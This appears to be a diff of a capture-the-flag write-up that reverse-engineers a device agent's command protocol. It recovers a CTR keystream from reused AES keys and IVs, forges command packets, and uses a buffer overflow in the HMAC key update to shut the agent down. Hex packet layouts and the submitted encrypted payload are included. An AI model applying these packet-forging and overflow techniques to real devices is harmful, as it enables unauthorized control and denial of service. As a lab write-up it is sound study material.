@@ -91,17 +91,24 @@ revisiting commands
 - each arg is a char[0x40] buffer,
 - max of 10 args
 
-### 0 stop waiting for other threads and remove restart file
+### 0: stop waiting for other threads and remove restart file
 - 0 args with arg check
+![](../resources/ghidra_set_unlink_command.png)
 
-### 1 run diagclient
+And the `unlink` happens back in main:
+![](../resources/ghidra_unlink_in_main.png)
+
+### 1: Run diagclient
 - 4 args without args check
+![](../resources/ghidra_run_diagclient_command.png)
 
 ### 2 update hmac
 - 1 arg with arg check
+![](../resources/ghidra_update_hmac_key_command.png)
 
 ### 3 set collect enabled
 - 2 args with arg check
+![](../resources/ghidra_set_collectors_enabled_command.png)
 
 ### 4 set collect disabled
 - 2 args with arg check
@@ -110,15 +117,24 @@ revisiting commands
 - 3 args with arg check
 - args are (ip, port, "alt")
 - unsure what alt is
+![](../resources/ghidra_send_msg_to_navigation.png)
 
 ### 6 stop waiting for other threads
 - no args no arg check
+![](../resources/ghidra_stop_agent_command.png)
 
 ### 7 change collectors
 - 3 args with arg check
+![](../resources/ghidra_change_collectors.png)
+
 
 # gathering info on the provided packets
-Though I don't have the private or public keys, the way that the AES key is generated is insufficient, as the same key and same IV are generated for each packet (at least for packets going to the same device), so xoring a given encrypted data section with the plaintext that was encrypted for the packet will yield the same encrypted block for each packet. This means that the AES key isn't actually needed to decrypt the packets, the plaintext for one packet just needs to be known to generate the key for each block.
+Though I don't have the private or public keys, the way that the AES key is generated is insufficient, as the same key and same IV are generated for each packet (at least for packets going to the same device). So there is already an issue with the cryptography, but in addition the AES mode that was used was `CTR` mode. [Here a wikipedia page that covers some of the details of this](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation).
+
+This is a picture from the wikipedia page that shows that the plain text and cipher text just have an `xor` operation run on them.
+![](../resources/1202px-CTR_decryption_2.svg.png)
+
+this means that xoring a given encrypted data section with the plaintext that was encrypted for the packet will yield the same ciphertext block for each packet which can be xored with any given packet to that host to decrypt the packet. This means that the AES key isn't actually needed to decrypt the packets, the plaintext for one packet just needs to be known to generate the key for each block.
 
 ```python
 p2_cmd_chunk = bytes.fromhex('75d6 5acd cf89 ca68 a28e 4431 4b22 9ed0')
@@ -149,7 +165,7 @@ diffing the packet command data
 ```
 
 
-What the packet 2 plaintext appears to be (from reversing the handler)
+From my work in task 8 reversing the handler and identifying the contents of packets based on the size of the command, this is what I thought the packet 2 plaintext would look like:
 ```
 p2_plaintext = b''.join([b'3'.ljust(0x40, b'\x00'),
                          b'2'.ljust(0x40, b'\x00'),
@@ -173,7 +189,7 @@ p2_plaintext = b''.join([b'3'.ljust(0x40, b'\x00'),
 000000f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
 ```
 
-xoring that plaintext with the encrypted packet yields this buffer of encryption key(s?):
+xoring that plaintext with the encrypted packet yields this buffer of an expanded AES key:
 ```
 00000000: 46d6 5acd cf89 ca68 a28e 4431 4b22 9ed0  F.Z....h..D1K"..
 00000010: 36df 20ad 07b1 fc90 9b63 92df e98b 4054  6. ......c....@T
@@ -215,15 +231,7 @@ plaintext is revealed (or atleast most of it, as much of the data as I have of p
 000000f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
 ```
 
-As a side effect of this property, any arbitrary command packet for this device can be crafted by
-xoring the plaintext with the key buffer extracted earlier. There is however a limitation on the
-size of packet that can be generated, as only as much key as is available in the second-largest
-packet will actually yield anything unless I can determine the plaintext contents of the rest of
-packet 3's command. Regardless of this limitation, the buffer extracted so far is enough space
-to fit any command except for the one that starts `diagclient`, the one that
-sends a message to navigation, and the one to change collectors, so it should be plenty for now.
-Those commands can still be called, I just don't actually have control over the arguments
-past argument 2.
+As a side effect of this property, any arbitrary command packet for this device can be crafted by xoring the plaintext with the key buffer extracted earlier. There is however a limitation on the size of packet that can be generated, as only as much key as is available in the second-largest packet will actually yield anything unless I can determine the plaintext contents of the rest of packet 3's command. Regardless of this limitation, the buffer extracted so far is enough space to fit any command except for the one that starts `diagclient`, the one that sends a message to navigation, and the one to change collectors, so it should be plenty for now.  Those commands can still be called, I just don't actually have control over the arguments past argument 2.
 
 
 # Finding a command to shut off the device
@@ -273,8 +281,7 @@ LAB_004008e0:
       }
 ```
 
-So this command stops `agent` and `unlink`s the file that would normally allow it to restart.
-To be clear, the only reason that I noticed this was because I decided to throw `agent` into `binaryninja` and saw the extra command.
+So this command stops `agent` and `unlink`s the file that would normally allow it to restart.  To be clear, the only reason that I noticed this was because I decided to throw `agent` into `binaryninja` and saw the extra command that ghidra happens to optimize out.
 
 Structure of the command:
 ```
@@ -293,12 +300,11 @@ Number of Arguments (0)
 00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
 ```
 
-After trying to reach this command for a while it appears that ghidra actually just optimized the unreachable case in the switch statement
-out.
+After trying to reach this command for a while it appears that ghidra actually just optimized the unreachable case in the switch statement out.
 
-So I turned to undefined behavior...
+So I turned to undefined behavior to try to solve my problems...
 
-Something I noticed while working on task 8 early on was that an hmac key greater than 0x40 bytes will cause a thread to exit early. After looking a little bit more at the main struct that was used everywhere I realized that the hmac buffer in the struct `[1]` is right before the two ints that actually determine whether the the `agent_restart` file is `unlink`ed are actually right past it.
+Something I noticed while working on task 8 early on was that an hmac key greater than 0x40 bytes will cause a thread to exit early. After looking a little bit more at the main struct that was used everywhere I realized that the hmac buffer in the struct `[1]` is right before the two ints that actually determine whether the the `agent_restart` file is `unlink`ed and whether `agent` stops listening to commands (`[2]` and `[3]`) and are actually right past it in the structure.
 
 
 ```c
@@ -317,9 +323,9 @@ struct main_workstruct {
     undefined8 collector_0x38;
     undefined8 collector_0x40;
     undefined8 collector_0x48;
-    char hmac_key_file_outbuf_0x50[64]; /* Created by retype action */ // [1]
-    int is_waiting_for_other_threads_0x90;
-    int do_agent_restart_unlink_on_return_to_main_0x94;
+    char hmac_key_file_outbuf_0x50[64]; /* Created by retype action */       <----- // [1]
+    int is_waiting_for_other_threads_0x90;                                   <----- // [2]
+    int do_agent_restart_unlink_on_return_to_main_0x94;                      <----- // [3]
     undefined4 collect_enabled_0x98; /* Created by retype action */
     undefined field18_0x9c;
     undefined field19_0x9d;
@@ -338,3 +344,78 @@ struct allocd_var_struct {
     void * field1_0x8;
 };
 ```
+
+Back in the `cmd_thread` function is where that buffer is actually populated:
+![](../resources/ghidra_read_in_hmac_key.png)
+
+![](../resources/ghidra_read_in_file_contents_wrapper.png)
+![](../resources/ghidra_read_in_file_contents.png)
+
+There is an issue with these functions; they take in a pointer to a buffer to fill and a filepath to read contents from, but they don't take in the size of the buffer to make sure that the data will all fit in the buffer. So there is a buffer overflow that occurs in `main_workstruct` if the contents of `/agent/hmac_key` are ever larger than 64 bytes.
+
+Because I could send any arbitrary command that takes 2 arguments or less, I could craft an hmac key update command that writes the contents of `/agent/hmac_key` to anything I want.
+
+![](../resources/ghidra_update_hmac_key_command.png)
+
+Even though the `UPDATE_HMAC` command only actually takes 1 arg, which would normally only fit 64 bytes worth of new hmac, the implementation of the `update_hmac_key` function doesn't actually truncate the contents written to the file to 64 bytes, it just runs `strlen` on the value to determine the size. This means that so long as the characters in the buffer are non-zero it will be written into the file.
+
+
+So I made this command assuming that either the extra zeroes or the null byte at the end of the string would overwrite the value of `do_agent_restart_unlink_on_return_to_main_0x94` with 0.
+```
+Command Type (UPDATE_HMAC)
+00000000: 3200 0000 0000 0000 0000 0000 0000 0000  2...............
+00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+
+Number of Arguments
+00000040: 3100 0000 0000 0000 0000 0000 0000 0000  1...............
+00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+
+New HMAC Key
+00000080: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+00000090: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+000000a0: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+000000b0: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+
+Extra argument (still read as a part of the hmac string)
+000000c0: 0101 0101 0000 0000 0000 0000 0000 0000  ................
+000000d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+000000e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+000000f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+```
+
+Full encrypted packet:
+```
+00000000: 6b17 d1f2 e12c 4247 f8bc e6e5 63a4 40f2  k....,BG....c.@.
+00000010: 7703 7d81 2deb 33a0 f4a1 3945 d898 c296  w.}.-.3...9E....
+00000020: 4fe3 42e2 fe1a 7f9b 8ee7 eb4a 7c0f 9e16  O.B........J|...
+00000030: 2bce 3357 6b31 5ece cbb6 4068 37bf 51f5  +.3Wk1^...@h7.Q.
+00000040: 6acd 6953 61d4 d25c 070f b408 276d 15d4  j.iSa..\....'m..
+00000050: 08f4 20ff e254 5da6 8693 cc9c 0961 f8a8  .. ..T]......a..
+00000060: 46d6 5acd cf89 ca68 a28e 4431 4b22 9ed0  F.Z....h..D1K"..
+00000070: 36df 20ad 07b1 fc90 9b63 92df e98b 4054  6. ......c....@T
+00000080: 3157 4da8 5e0d 98f1 a099 a996 37d4 1911  1WM.^.......7...
+00000090: 1b0e 79f8 4621 67ae a2f0 01eb a278 4c1b  ..y.F!g......xL.
+000000a0: 264f 95f1 507e d948 68da 697a 6575 6839  &O..P~.Hh.izeuh9
+000000b0: 08dd 96a0 64a0 783e 2fe0 65af 18a1 020c  ....d.x>/.e.....
+000000c0: e1d8 86d3 1199 2af6 38e0 0945 bcf9 9fe1  ......*.8..E....
+000000d0: e800 7d6a b719 e569 6b53 5f85 9326 7a0b  ..}j...ikS_..&z.
+000000e0: 6ae4 74e0 99e9 8189 ff29 af90 eed0 3444  j.t......)....4D
+000000f0: 664d 5d23 87c5 9590 3397 96a4 2f09 1e14  fM]#....3.../...
+00000100: 1a48 6b48 9198 10d0 a460 d81b 77fb 8f67  .HkH.....`..w..g
+00000110: 1b2f 7e99 3b69 5932 2953 a2c8 3625 4ce4  ./~.;iY2)S..6%L.
+00000120: 99f5 7123 048f 58d5 306b 9dea c34f 92d8  ..q#..X.0k...O..
+00000130: b948 8081 5870 96d5 6084 6caf 2e17 ff43  .H..Xp..`.l....C
+00000140: 58ac 91d5 9f75 018d d868 10fa 21c1 940c  X....u...h..!...
+00000150: 27cc d781 c4ec 3a93 bf6f c40e 44a0 91f2  '.....:..o..D...
+```
+
+What I submitted:
+```
+6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c2964fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f56acd695361d4d25c070fb408276d15d408f420ffe2545da68693cc9c0961f8a846d65acdcf89ca68a28e44314b229ed036df20ad07b1fc909b6392dfe98b405431574da85e0d98f1a099a99637d419111b0e79f8462167aea2f001eba2784c1b264f95f1507ed94868da697a6575683908dd96a064a0783e2fe065af18a1020ce1d886d311992af638e00945bcf99fe1e8007d6ab719e5696b535f8593267a0b6ae474e099e98189ff29af90eed03444664d5d2387c59590339796a42f091e141a486b48919810d0a460d81b77fb8f671b2f7e993b6959322953a2c836254ce499f57123048f58d5306b9deac34f92d8b9488081587096d560846caf2e17ff4358ac91d59f75018dd86810fa21c1940c27ccd781c4ec3a93bf6fc40e44a091f2
+```
+
+
